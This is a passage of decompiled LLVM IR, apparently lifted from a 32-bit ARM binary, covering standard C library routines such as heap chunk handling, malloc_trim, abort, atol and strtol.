  %v3_12b18 = load i32, i32* %v2_12b18, align 4
  store i32 %v3_12b18, i32* %r2.global-to-local, align 4
  %v1_12b1c = add i32 %v3_12b18, 12
  %v2_12b1c = inttoptr i32 %v1_12b1c to i32*
  %v3_12b1c = load i32, i32* %v2_12b1c, align 4
  store i32 %v3_12b1c, i32* %r4.global-to-local, align 4
  %v9_12b20 = icmp eq i32 %v3_12b1c, %v2_12b14
  %v1_12b24 = add i32 %v2_12b14, 12
  %v2_12b24 = inttoptr i32 %v1_12b24 to i32*
  %v3_12b24 = load i32, i32* %v2_12b24, align 4
  store i32 %v3_12b24, i32* %r0.global-to-local, align 4
  br i1 %v9_12b20, label %dec_label_pc_12b2c, label %dec_label_pc_12b90

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12b10
  %v1_12b2c = add i32 %v3_12b24, 8
  %v2_12b2c = inttoptr i32 %v1_12b2c to i32*
  %v3_12b2c = load i32, i32* %v2_12b2c, align 4
  store i32 %v3_12b2c, i32* %r3.global-to-local, align 4
  %v9_12b30 = icmp eq i32 %v3_12b2c, %v2_12b14
  br i1 %v9_12b30, label %dec_label_pc_12b38, label %dec_label_pc_12b90

dec_label_pc_12b38:                               ; preds = %dec_label_pc_12b2c
  store i32 %v3_12b18, i32* %v2_12b2c, align 4
  %v0_12b3c = load i32, i32* %r0.global-to-local, align 4
  %v1_12b3c = load i32, i32* %r2.global-to-local, align 4
  %v2_12b3c = add i32 %v1_12b3c, 12
  %v3_12b3c = inttoptr i32 %v2_12b3c to i32*
  store i32 %v0_12b3c, i32* %v3_12b3c, align 4
  %v0_12b40 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b40 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b40 = add i32 %v1_12b40, %v0_12b40
  store i32 %v2_12b40, i32* %ip.global-to-local, align 4
  %v0_12b50.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12b54.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12b44

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12af4, %dec_label_pc_12b38
  %v0_12bd0 = phi i32 [ %v1_12b00, %dec_label_pc_12af4 ], [ %v2_12b40, %dec_label_pc_12b38 ]
  %v0_12b54 = phi i32 [ %v3_12b08, %dec_label_pc_12af4 ], [ %v0_12b54.pre, %dec_label_pc_12b38 ]
  %v1_12b68 = phi i32 [ %v2_12b00, %dec_label_pc_12af4 ], [ %v0_12b50.pre, %dec_label_pc_12b38 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12b48 = load i32, i32* @r7, align 4
  %v2_12b48 = add i32 %v0_12b48, 64
  %v3_12b48 = inttoptr i32 %v2_12b48 to i32*
  %v4_12b48 = load i32, i32* %v3_12b48, align 4
  store i32 %v4_12b48, i32* %r2.global-to-local, align 4
  %v1_12b4c = add i32 %v4_12b48, 44
  %v2_12b4c = inttoptr i32 %v1_12b4c to i32*
  %v3_12b4c = load i32, i32* %v2_12b4c, align 4
  store i32 %v3_12b4c, i32* %r3.global-to-local, align 4
  %v9_12b50 = icmp eq i32 %v1_12b68, %v3_12b4c
  %v1_12b54 = and i32 %v0_12b54, -4
  store i32 %v1_12b54, i32* %r0.global-to-local, align 4
  br i1 %v9_12b50, label %dec_label_pc_12bd0, label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b44
  %v2_12b5c = add i32 %v1_12b68, %v1_12b54
  store i32 %v2_12b5c, i32* %r3.global-to-local, align 4
  %v1_12b60 = add i32 %v2_12b5c, 4
  %v2_12b60 = inttoptr i32 %v1_12b60 to i32*
  %v3_12b60 = load i32, i32* %v2_12b60, align 4
  store i32 %v3_12b60, i32* %r3.global-to-local, align 4
  %v1_12b64 = urem i32 %v3_12b60, 2
  %v2_12b64 = icmp eq i32 %v1_12b64, 0
  %v2_12b68 = add i32 %v1_12b68, 4
  %v3_12b68 = inttoptr i32 %v2_12b68 to i32*
  store i32 %v1_12b54, i32* %v3_12b68, align 4
  br i1 %v2_12b64, label %dec_label_pc_12b70, label %dec_label_pc_12b5c.dec_label_pc_12ba0_crit_edge

dec_label_pc_12b5c.dec_label_pc_12ba0_crit_edge:  ; preds = %dec_label_pc_12b5c
  %v0_12bb0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ba0

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b5c
  %v0_12b70 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b70 = add i32 %v0_12b70, 8
  %v2_12b70 = inttoptr i32 %v1_12b70 to i32*
  %v3_12b70 = load i32, i32* %v2_12b70, align 4
  store i32 %v3_12b70, i32* %r1.global-to-local, align 4
  %v1_12b74 = add i32 %v3_12b70, 12
  %v2_12b74 = inttoptr i32 %v1_12b74 to i32*
  %v3_12b74 = load i32, i32* %v2_12b74, align 4
  store i32 %v3_12b74, i32* %r3.global-to-local, align 4
  %v9_12b78 = icmp eq i32 %v3_12b74, %v0_12b70
  %v1_12b7c = add i32 %v0_12b70, 12
  %v2_12b7c = inttoptr i32 %v1_12b7c to i32*
  %v3_12b7c = load i32, i32* %v2_12b7c, align 4
  store i32 %v3_12b7c, i32* %r2.global-to-local, align 4
  br i1 %v9_12b78, label %dec_label_pc_12b84, label %dec_label_pc_12b90

dec_label_pc_12b84:                               ; preds = %dec_label_pc_12b70
  %v1_12b84 = add i32 %v3_12b7c, 8
  %v2_12b84 = inttoptr i32 %v1_12b84 to i32*
  %v3_12b84 = load i32, i32* %v2_12b84, align 4
  store i32 %v3_12b84, i32* %r3.global-to-local, align 4
  %v9_12b88 = icmp eq i32 %v3_12b84, %v0_12b70
  br i1 %v9_12b88, label %dec_label_pc_12b94, label %dec_label_pc_12b90

dec_label_pc_12b90:                               ; preds = %dec_label_pc_12b70, %dec_label_pc_12b2c, %dec_label_pc_12b10, %dec_label_pc_12b84
  %v0_12b90 = call i32 @abort()
  store i32 %v0_12b90, i32* %r0.global-to-local, align 4
  %v0_12b94.pre = load i32, i32* @r1, align 4
  %v1_12b94.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b84, %dec_label_pc_12b90
  %v1_12b94 = phi i32 [ %v3_12b7c, %dec_label_pc_12b84 ], [ %v1_12b94.pre, %dec_label_pc_12b90 ]
  %v0_12b94 = phi i32 [ %v3_12b70, %dec_label_pc_12b84 ], [ %v0_12b94.pre, %dec_label_pc_12b90 ]
  %v2_12b94 = add i32 %v1_12b94, 8
  %v3_12b94 = inttoptr i32 %v2_12b94 to i32*
  store i32 %v0_12b94, i32* %v3_12b94, align 4
  %v0_12b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b98 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b98 = add i32 %v1_12b98, 12
  %v3_12b98 = inttoptr i32 %v2_12b98 to i32*
  store i32 %v0_12b98, i32* %v3_12b98, align 4
  %v0_12b9c = load i32, i32* %ip.global-to-local, align 4
  %v1_12b9c = load i32, i32* %r0.global-to-local, align 4
  %v2_12b9c = add i32 %v1_12b9c, %v0_12b9c
  store i32 %v2_12b9c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ba0

dec_label_pc_12ba0:                               ; preds = %dec_label_pc_12b5c.dec_label_pc_12ba0_crit_edge, %dec_label_pc_12b94
  %v0_12bb0 = phi i32 [ %v0_12bb0.pre, %dec_label_pc_12b5c.dec_label_pc_12ba0_crit_edge ], [ %v2_12b9c, %dec_label_pc_12b94 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12ba4 = load i32, i32* @r7, align 4
  %v2_12ba4 = add i32 %v0_12ba4, 64
  %v3_12ba4 = inttoptr i32 %v2_12ba4 to i32*
  %v4_12ba4 = load i32, i32* %v3_12ba4, align 4
  %v1_12ba8 = add i32 %v4_12ba4, 52
  store i32 %v1_12ba8, i32* %r3.global-to-local, align 4
  %v1_12bac = add i32 %v4_12ba4, 60
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  store i32 %v3_12bac, i32* %r1.global-to-local, align 4
  %v1_12bb0 = or i32 %v0_12bb0, 1
  store i32 %v1_12bb0, i32* %r2.global-to-local, align 4
  %v1_12bb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12bb4 = add i32 %v1_12bb4, 12
  %v3_12bb4 = inttoptr i32 %v2_12bb4 to i32*
  store i32 %v1_12ba8, i32* %v3_12bb4, align 4
  %v0_12bb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12bb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_12bb8 = add i32 %v1_12bb8, 8
  %v3_12bb8 = inttoptr i32 %v2_12bb8 to i32*
  store i32 %v0_12bb8, i32* %v3_12bb8, align 4
  %v0_12bbc = load i32, i32* %r2.global-to-local, align 4
  %v1_12bbc = load i32, i32* %r4.global-to-local, align 4
  %v2_12bbc = add i32 %v1_12bbc, 4
  %v3_12bbc = inttoptr i32 %v2_12bbc to i32*
  store i32 %v0_12bbc, i32* %v3_12bbc, align 4
  %v0_12bc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12bc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_12bc0 = add i32 %v1_12bc0, %v0_12bc0
  %v4_12bc0 = inttoptr i32 %v3_12bc0 to i32*
  store i32 %v0_12bc0, i32* %v4_12bc0, align 4
  %v0_12bc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12bc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bc4 = add i32 %v1_12bc4, 12
  %v3_12bc4 = inttoptr i32 %v2_12bc4 to i32*
  store i32 %v0_12bc4, i32* %v3_12bc4, align 4
  %v0_12bc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12bc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12bc8 = add i32 %v1_12bc8, 8
  %v3_12bc8 = inttoptr i32 %v2_12bc8 to i32*
  store i32 %v0_12bc8, i32* %v3_12bc8, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12b44
  %v2_12bd0 = add i32 %v1_12b54, %v0_12bd0
  store i32 %v2_12bd0, i32* %ip.global-to-local, align 4
  %v1_12bd4 = or i32 %v2_12bd0, 1
  store i32 %v1_12bd4, i32* %r3.global-to-local, align 4
  %v0_12bd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12bd8, i32* %v2_12b4c, align 4
  %v0_12bdc = load i32, i32* %r3.global-to-local, align 4
  %v1_12bdc = load i32, i32* %r4.global-to-local, align 4
  %v2_12bdc = add i32 %v1_12bdc, 4
  %v3_12bdc = inttoptr i32 %v2_12bdc to i32*
  store i32 %v0_12bdc, i32* %v3_12bdc, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12ba0, %dec_label_pc_12bd0
  %v0_12be0 = load i32, i32* %ip.global-to-local, align 4
  %v3_12be4 = icmp ult i32 %v0_12be0, 131070
  br i1 %v3_12be4, label %dec_label_pc_12c50, label %dec_label_pc_12be8

dec_label_pc_12be8:                               ; preds = %dec_label_pc_12be0
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12bec = load i32, i32* @r7, align 4
  %v2_12bec = add i32 %v0_12bec, 64
  %v3_12bec = inttoptr i32 %v2_12bec to i32*
  %v4_12bec = load i32, i32* %v3_12bec, align 4
  store i32 %v4_12bec, i32* @r4, align 4
  %v1_12bf0 = inttoptr i32 %v4_12bec to i32*
  %v2_12bf0 = load i32, i32* %v1_12bf0, align 4
  store i32 %v2_12bf0, i32* %r3.global-to-local, align 4
  %v1_12bf4 = and i32 %v2_12bf0, 2
  %v2_12bf4 = icmp eq i32 %v1_12bf4, 0
  br i1 %v2_12bf4, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12be8
  store i32 %v4_12bec, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12be8, %bb
  %v1_12bfc = xor i1 %v2_12bf4, true
  call void @__pseudo_cond_branch(i1 %v1_12bfc, i32 ptrtoint (i32* @global_var_128a0.458 to i32))
  %v0_12c00 = load i32, i32* @r4, align 4
  %v1_12c00 = add i32 %v0_12c00, 44
  %v2_12c00 = inttoptr i32 %v1_12c00 to i32*
  %v3_12c00 = load i32, i32* %v2_12c00, align 4
  store i32 %v3_12c00, i32* %r3.global-to-local, align 4
  %v1_12c04 = add i32 %v3_12c00, 4
  %v2_12c04 = inttoptr i32 %v1_12c04 to i32*
  %v3_12c04 = load i32, i32* %v2_12c04, align 4
  store i32 %v3_12c04, i32* %r3.global-to-local, align 4
  %v1_12c08 = add i32 %v0_12c00, 836
  %v2_12c08 = inttoptr i32 %v1_12c08 to i32*
  %v3_12c08 = load i32, i32* %v2_12c08, align 4
  store i32 %v3_12c08, i32* %r2.global-to-local, align 4
  %v1_12c0c = and i32 %v3_12c04, -4
  store i32 %v1_12c0c, i32* %r3.global-to-local, align 4
  %v3_12c10 = icmp ult i32 %v1_12c0c, %v3_12c08
  br i1 %v3_12c10, label %dec_label_pc_12c50, label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %bb16
  store i32 %v0_12c00, i32* %r1.global-to-local, align 4
  %v1_12c1c = add i32 %v0_12c00, 840
  %v2_12c1c = inttoptr i32 %v1_12c1c to i32*
  %v3_12c1c = load i32, i32* %v2_12c1c, align 4
  store i32 %v3_12c1c, i32* %r0.global-to-local, align 4
  %v2_12c20 = call i32 @__malloc_trim(i32 %v3_12c1c, i32 %v0_12c00)
  store i32 %v2_12c20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12aec
  %v2_12c28 = inttoptr i32 %v1_12abc to i32*
  %v3_12c28 = load i32, i32* %v2_12c28, align 4
  store i32 %v3_12c28, i32* %r0.global-to-local, align 4
  %v1_12c2c = add i32 %v4_12aac, 848
  %v2_12c2c = inttoptr i32 %v1_12c2c to i32*
  %v3_12c2c = load i32, i32* %v2_12c2c, align 4
  store i32 %v3_12c2c, i32* %r2.global-to-local, align 4
  %v1_12c30 = add i32 %v4_12aac, 868
  %v2_12c30 = inttoptr i32 %v1_12c30 to i32*
  %v3_12c30 = load i32, i32* %v2_12c30, align 4
  %v2_12c34 = add i32 %v3_12c28, %v1_12ab8
  store i32 %v2_12c34, i32* %r1.global-to-local, align 4
  %v1_12c38 = add i32 %v3_12c2c, -1
  store i32 %v1_12c38, i32* %r2.global-to-local, align 4
  %v2_12c3c = sub i32 %v3_12c30, %v2_12c34
  store i32 %v2_12c3c, i32* %r3.global-to-local, align 4
  store i32 %v2_12c3c, i32* %v2_12c30, align 4
  %v1_12c44 = load i32, i32* @lr, align 4
  %v2_12c44 = add i32 %v1_12c44, 848
  %v3_12c44 = inttoptr i32 %v2_12c44 to i32*
  store i32 %v1_12c38, i32* %v3_12c44, align 4
  %v0_12c48 = load i32, i32* %r0.global-to-local, align 4
  %v1_12c48 = load i32, i32* @r5, align 4
  %v2_12c48 = sub i32 %v1_12c48, %v0_12c48
  store i32 %v2_12c48, i32* %r0.global-to-local, align 4
  %v4_12c4c = call i32 @munmap(i32 %v2_12c48, i32 %v2_12c34, i32 %v1_12c38, i32 %v2_12c3c)
  store i32 %v4_12c4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %bb16, %dec_label_pc_12be0, %dec_label_pc_12c18, %dec_label_pc_12acc, %dec_label_pc_12c28
  store i32 %v2_12a60, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r7, align 4
  %v2_12c5c = add i32 %v0_12c5c, 44
  %v3_12c5c = inttoptr i32 %v2_12c5c to i32*
  %v4_12c5c = load i32, i32* %v3_12c5c, align 4
  store i32 %v4_12c5c, i32* %ip.global-to-local, align 4
  store i32 76904, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12c5c)
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %entry, %dec_label_pc_12c50
  store i32 %v3_12a54, i32* @r4, align 4
  store i32 %v6_12a54, i32* @r5, align 4
  store i32 %v9_12a54, i32* @r6, align 4
  store i32 %v12_12a54, i32* @r7, align 4
  store i32 %v18_12a54, i32* @lr, align 4
  ret i32 %v2_12a60

; uselistorder directives
  uselistorder i32 %v0_12c00, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_12bc0, { 1, 0 }
  uselistorder i32 %v1_12b00, { 1, 0 }
  uselistorder i32 %v0_12b00, { 1, 0 }
  uselistorder i32 %v3_12ad4, { 1, 0 }
  uselistorder i32 %v1_12ab8, { 1, 0, 2 }
  uselistorder i32 %v2_12ab4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12aac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12a5c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12c68, { 1, 0 }
  uselistorder label %dec_label_pc_12c50, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_12be0, { 1, 0 }
  uselistorder label %dec_label_pc_12ba0, { 1, 0 }
  uselistorder label %dec_label_pc_12b94, { 1, 0 }
  uselistorder label %dec_label_pc_12b90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12b44, { 1, 0 }
}

define i32 @function_12c78(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c78:
  %v0_12c78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c78, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12c78
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12c78, %bb
  %v4_12c8c = phi i32 [ %arg1, %dec_label_pc_12c78 ], [ 0, %bb ]
  ret i32 %v4_12c8c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_12c90 = load i32, i32* @r4, align 4
  store i32 %v3_12c90, i32* %stack_var_-12, align 4
  %v6_12c90 = load i32, i32* @r5, align 4
  %v9_12c90 = load i32, i32* @lr, align 4
  %v4_12ca0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_12ca0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_12ca0, i32* @r0, align 4
  %v0_12cb0 = call i32 @__malloc_consolidate()
  %v0_12cb4 = load i32, i32* @r4, align 4
  %v0_12cb8 = load i32, i32* @r5, align 4
  %v2_12cc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12cc0, i32* @r4, align 4
  store i32 %v6_12c90, i32* @r5, align 4
  store i32 %v9_12c90, i32* @lr, align 4
  %v2_12cc4 = call i32 @__malloc_trim(i32 %v0_12cb4, i32 %v0_12cb8)
  %v0_12cc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12cc8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_12cc8 = load i32, i32* @lr, align 4
  %v3_12cc8 = inttoptr i32 %v2_12cc4 to i32*
  store i32 %v1_12cc8, i32* %v3_12cc8, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_12ccc = phi i32 [ %v2_12cc4, %entry ], [ 0, %bb ]
  ret i32 %v4_12ccc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r5, align 4
  %v4_12ce8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 16) to i32*), align 4
  store i32 77044, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12ce8)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_12d10 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_12d18 = load i32, i32* @r5, align 4
  %v2_12d18 = add i32 %v0_12d18, 632
  %v3_12d18 = inttoptr i32 %v2_12d18 to i32*
  %v4_12d18 = load i32, i32* %v3_12d18, align 4
  %v2_12d1c = icmp eq i32 %v4_12d18, 0
  br i1 %v2_12d1c, label %dec_label_pc_12d24, label %dec_label_pc_12d64

dec_label_pc_12d24:                               ; preds = %entry
  store i32 1, i32* %v3_12d18, align 4
  br label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d74, %dec_label_pc_12d24
  %v0_12d30 = load i32, i32* @r5, align 4
  %v2_12d30 = add i32 %v0_12d30, 212
  store i32 %v2_12d30, i32* @r4, align 4
  %v2_12d3c = add i32 %v0_12d30, 68
  %v3_12d3c = inttoptr i32 %v2_12d3c to i32*
  %v4_12d3c = load i32, i32* %v3_12d3c, align 4
  call void @__pseudo_branch(i32 %v4_12d3c)
  %v1_12d4c = call i32 @__GI_raise(i32 6)
  %v0_12d58 = load i32, i32* @r5, align 4
  %v2_12d58 = add i32 %v0_12d58, 16
  %v3_12d58 = inttoptr i32 %v2_12d58 to i32*
  %v4_12d58 = load i32, i32* %v3_12d58, align 4
  store i32 77156, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12d58)
  %v0_12d68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %entry, %dec_label_pc_12d2c
  %v1_12d7c = phi i32 [ %v0_12d18, %entry ], [ %v0_12d68.pre, %dec_label_pc_12d2c ]
  %v2_12d68 = add i32 %v1_12d7c, 632
  %v3_12d68 = inttoptr i32 %v2_12d68 to i32*
  %v4_12d68 = load i32, i32* %v3_12d68, align 4
  %v7_12d6c = icmp eq i32 %v4_12d68, 1
  br i1 %v7_12d6c, label %dec_label_pc_12d74, label %dec_label_pc_12db0

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d64
  %v2_12d74 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12d74, i32* @r4, align 4
  store i32 2, i32* %v3_12d68, align 4
  %v3_12d8c = bitcast i32* %stack_var_-28 to i8*
  %v4_12d8c = call i32 @__GI_memset(i8* %v3_12d8c, i32 0, i32 20)
  %v3_12da8 = call i32 @__libc_sigaction(i32 6, i32 %v2_12d74, i32 0)
  br label %dec_label_pc_12d2c

dec_label_pc_12db0:                               ; preds = %dec_label_pc_12d64
  %v7_12db0 = icmp eq i32 %v4_12d68, 2
  br i1 %v7_12db0, label %dec_label_pc_12db8, label %dec_label_pc_12dc4

dec_label_pc_12db8:                               ; preds = %dec_label_pc_12db0
  store i32 3, i32* %v3_12d68, align 4
  %v0_12dc0 = call i32 @abort()
  %v0_12dc4.pre = load i32, i32* @r5, align 4
  %v1_12dc4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12db0, %dec_label_pc_12db8
  %v3_12dd0 = phi i32 [ 632, %dec_label_pc_12db0 ], [ %v1_12dc4.pre, %dec_label_pc_12db8 ]
  %v2_12dd0 = phi i32 [ %v1_12d7c, %dec_label_pc_12db0 ], [ %v0_12dc4.pre, %dec_label_pc_12db8 ]
  %v2_12dc4 = add i32 %v2_12dd0, %v3_12dd0
  %v3_12dc4 = inttoptr i32 %v2_12dc4 to i32*
  %v4_12dc4 = load i32, i32* %v3_12dc4, align 4
  %v7_12dc8 = icmp eq i32 %v4_12dc4, 3
  br i1 %v7_12dc8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12dc4
  store i32 4, i32* %v3_12dc4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12dc4, %bb
  call void @__pseudo_cond_branch(i1 %v7_12dc8, i32 ptrtoint (i32* @global_var_149b0.468 to i32))
  br label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12ddc, %.thread2
  %v0_12ddc = call i32 @abort()
  br label %dec_label_pc_12ddc

; uselistorder directives
  uselistorder i32* %v3_12d68, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12dc4, { 1, 0 }
  uselistorder label %dec_label_pc_12d64, { 1, 0 }
}

define i32 @function_12de8(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12de8:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_12de8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12de8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12de8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12de8, %bb
  %v4_12df4 = phi i32 [ %tmp, %dec_label_pc_12de8 ], [ 0, %bb ]
  ret i32 %v4_12df4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_12e08 = call i32 @strtol()
  ret i32 %v0_12e08
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_12e24 = call i32 @_stdlib_strto_l()
  ret i32 %v0_12e24
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v0_12e48 = load i32, i32* @r1, align 4
  store i32 %v0_12e48, i32* %sb.global-to-local, align 4
  %v0_12e4c = load i32, i32* @r2, align 4
  store i32 %v0_12e4c, i32* %r5.global-to-local, align 4
  %v0_12e50 = load i32, i32* @r0, align 4
  store i32 %v0_12e50, i32* %r4.global-to-local, align 4
  %v0_12e54 = load i32, i32* @r3, align 4
  br label %dec_label_pc_12e60

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e60
  %v1_12e5c = add i32 %v0_12e98, 1
  store i32 %v1_12e5c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %entry, %dec_label_pc_12e5c
  %v0_12e98 = phi i32 [ %v0_12e50, %entry ], [ %v1_12e5c, %dec_label_pc_12e5c ]
  %v1_12e60 = inttoptr i32 %v0_12e98 to i8*
  %v2_12e60 = load i8, i8* %v1_12e60, align 1
  %v3_12e60 = zext i8 %v2_12e60 to i32
  store i32 %v3_12e60, i32* %r1.global-to-local, align 4
  %v4_12e64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 276) to i32*), align 4
  %v2_12e68 = mul nuw nsw i32 %v3_12e60, 2
  %v2_12e6c = add i32 %v2_12e68, %v4_12e64
  %v3_12e6c = inttoptr i32 %v2_12e6c to i16*
  %v4_12e6c = load i16, i16* %v3_12e6c, align 2
  %v1_12e70 = and i16 %v4_12e6c, 32
  %v2_12e70 = icmp eq i16 %v1_12e70, 0
  br i1 %v2_12e70, label %dec_label_pc_12e78, label %dec_label_pc_12e5c

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e60
  %v7_12e78 = icmp eq i8 %v2_12e60, 43
  br i1 %v7_12e78, label %dec_label_pc_12e98, label %dec_label_pc_12e80

dec_label_pc_12e80:                               ; preds = %dec_label_pc_12e78
  %v7_12e80 = icmp eq i8 %v2_12e60, 45
  br i1 %v7_12e80, label %dec_label_pc_12e98, label %bb

bb:                                               ; preds = %dec_label_pc_12e80
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12e9c

dec_label_pc_12e98:                               ; preds = %dec_label_pc_12e78, %dec_label_pc_12e80
